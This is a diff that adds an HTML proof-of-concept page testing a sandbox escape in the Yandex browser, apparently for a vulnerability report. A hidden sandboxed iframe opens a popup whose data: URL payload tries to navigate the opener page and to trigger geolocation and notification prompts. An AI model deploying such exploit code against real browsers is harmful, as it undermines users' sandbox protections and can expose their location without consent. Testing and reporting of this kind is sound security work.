@@ -1,16 +1,137 @@
 <!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Yandex Sandbox Escape (No intent://)</title>
+<style>
+  body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; padding: 16px; line-height: 1.45; }
+  .card { border: 1px solid #ddd; border-radius: 12px; padding: 16px; margin: 12px 0; }
+  button, a.btn { display: inline-block; padding: 10px 14px; border-radius: 10px; border: 1px solid #999; text-decoration: none; }
+  code { background: #f6f6f6; padding: 2px 6px; border-radius: 6px; }
+  .log { white-space: pre-wrap; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; background: #0b1020; color: #cde3ff; padding: 12px; border-radius: 10px; }
+</style>
+</head>
+<body>
+<h1>Yandex Sandbox Escape PoC (no custom schemes)</h1>
+
+<p>This PoC tries to show that a sandboxed iframe with <code>allow-scripts allow-popups</code> can spawn an auxiliary window/tab
+that lacks sandbox restrictions (potential "escape").</p>
+
+<div class="card">
+  <ol>
+    <li>Tap <strong>Run Exploit</strong>.</li>
+    <li>If a new tab opens, follow any prompts it shows.</li>
+    <li>Watch the <strong>logs</strong> for results (hash change, opener navigation, permission prompts).</li>
+  </ol>
+  <button id="start">Run Exploit</button>
+</div>
+
+<div class="card">
+  <h3>Live Log</h3>
+  <div id="log" class="log" aria-live="polite"></div>
+</div>
+
+<hr />
+
+<!-- The sandboxed iframe: only scripts + popups allowed -->
+<iframe id="sbx" sandbox="allow-scripts allow-popups" style="width:1px;height:1px;opacity:0;border:0;"
+  srcdoc="
+<!DOCTYPE html>
 <html>
-  <body>
-    <h3>Sandboxed iframe with tg:// link</h3>
-    <iframe
-      sandbox
-      srcdoc="
-        <a href='tg://resolve?domain=telegram'> alt='CLICK ME' width='200'>
-        </a>
-      "
-      width="300"
-      height="100"
-      style="border:1px solid black"
-    ></iframe>
-  </body>
+<head><meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
+<title>Sandboxed child</title></head>
+<body>
+<script>
+(function(){
+  function log(msg){ parent.postMessage({t:'log', msg: String(msg)}, '*'); }
+  function result(k, v){ parent.postMessage({t:'kv', key:k, val:String(v)}, '*'); }
+
+  // --- Test A: Open an auxiliary browsing context from sandbox.
+  // Use about:blank then fully controlled data: URL to avoid external schemes.
+  function openAux(){
+    try{
+      // Must be in a user gesture; parent will call this on click.
+      var w = window.open('about:blank', '_blank');
+      if(!w){ result('aux_open', 'BLOCKED'); return null; }
+      result('aux_open', 'OPENED');
+      // Prepare the payload page as a data URL so we control origin and script.
+      var payload = [
+        '<!DOCTYPE html><html><head><meta charset=\\'utf-8\\'><title>Aux Window</title>',
+        '<style>body{font-family:system-ui;padding:14px}</style></head><body>',
+        '<h2>Aux Window (should be sandboxed if Yandex inherits flags)</h2>',
+        '<div id=out style=white-space:pre-wrap;font-family:ui-monospace;background:#f6f6f6;padding:8px;border-radius:8px></div>',
+        '<script>',
+        'function say(x){ try{ opener.postMessage({t:\\'from_aux\\', msg:String(x)}, \\\"*\\\"); }catch(e){} }',
+        'function p(x){ document.getElementById(\\'out\\').textContent += x + \\\"\\n\\\"; }',
+        'p(\\'UserAgent: \\'+navigator.userAgent);',
+        'p(\\'Referrer: \\'+document.referrer);',
+        'p(\\'Has opener: \\'+(!!window.opener));',
+        '// --- Test B1: Try to mutate opener URL hash (should be blocked if sandbox constraints propagate)',
+        'try{ if(window.opener){ window.opener.location.hash = \\\"#aux-was-here\\\"; p(\\\"Set opener.hash OK\\\"); say(\\\"Set opener.hash OK\\\"); } }catch(e){ p(\\\"Set opener.hash BLOCKED: \\\"+e); }',
+        '// --- Test B2: Try full top navigation via opener (should be blocked by sandbox)',
+        'try{ if(window.opener){ window.opener.location = \\\"https://example.com/#navigated-by-aux\\\"; p(\\\"Opener navigation attempted\\\"); say(\\\"Opener navigation attempted\\\"); } }catch(e){ p(\\\"Opener navigation BLOCKED: \\\"+e); }',
+        '// --- Test C: Try permission-gated APIs (geolocation + notifications)',
+        'try{ if(navigator.geolocation){ navigator.geolocation.getCurrentPosition(function(pos){ p(\\\"Geolocation SUCCESS (lat,lon): \\\"+pos.coords.latitude+\\\",\\\"+pos.coords.longitude); say(\\\"Geolocation prompt/allow\\\"); }, function(err){ p(\\\"Geolocation error: \\\"+err.code+\\\"/\\\"+err.message);}); } }catch(e){ p(\\\"Geolocation call BLOCKED: \\\"+e); }',
+        'try{ if(window.Notification && Notification.requestPermission){ Notification.requestPermission().then(function(s){ p(\\\"Notification perm: \\\"+s); say(\\\"Notification perm: \\\"+s); }); } }catch(e){ p(\\\"Notification request BLOCKED: \\\"+e); }',
+        '</' + 'script></body></html>'
+      ].join('');
+      var url = 'data:text/html;charset=utf-8,' + encodeURIComponent(payload);
+      w.location = url;
+      return w;
+    }catch(e){
+      result('aux_open_error', e);
+      return null;
+    }
+  }
+
+  // Expose to parent
+  window.__sbx_openAux = openAux;
+})();
+</script>
+</body>
+</html>
+"></iframe>
+
+<script>
+const logEl = document.getElementById('log');
+function log(x){ logEl.textContent += x + "\n"; }
+function kv(k,v){ log(`${k}: ${v}`); }
+
+window.addEventListener('message', (ev) => {
+  const d = ev.data || {};
+  if(d.t === 'log') log(d.msg);
+  if(d.t === 'kv') kv(d.key, d.val);
+  if(d.t === 'from_aux') log('[AUX] ' + d.msg);
+});
+
+document.getElementById('start').addEventListener('click', () => {
+  log('== Clicked: starting from sandboxed iframe ==');
+  const fr = document.getElementById('sbx');
+  try{
+    const openAux = fr.contentWindow.__sbx_openAux;
+    if(typeof openAux !== 'function'){
+      log('Sandbox content not ready or blocked.');
+      return;
+    }
+    const w = openAux();
+    if(!w){ log('Popup blocked or sandbox prevented aux window.'); }
+    else { log('Aux window opened. Follow instructions on that tab (if visible).'); }
+  }catch(e){
+    log('Error invoking sandbox child: ' + e);
+  }
+});
+</script>
+
+<div class="card">
+  <h3>What counts as a sandbox escape here?</h3>
+  <ul>
+    <li><strong>Aux window opens and is unsandboxed</strong>: It can freely script and see <code>window.opener</code> and mutate opener’s URL hash.</li>
+    <li><strong>Opener navigation succeeds</strong>: The aux window changes or fully navigates the top-level page (should be blocked if sandbox flags propagate).</li>
+    <li><strong>Permission prompts appear</strong> from the aux window action that originated in a sandboxed context.</li>
+  </ul>
+  <p>If any of the above occurs on Yandex, document with a screen recording and include this file + version info in your report.</p>
+</div>
+
+</body>
 </html>
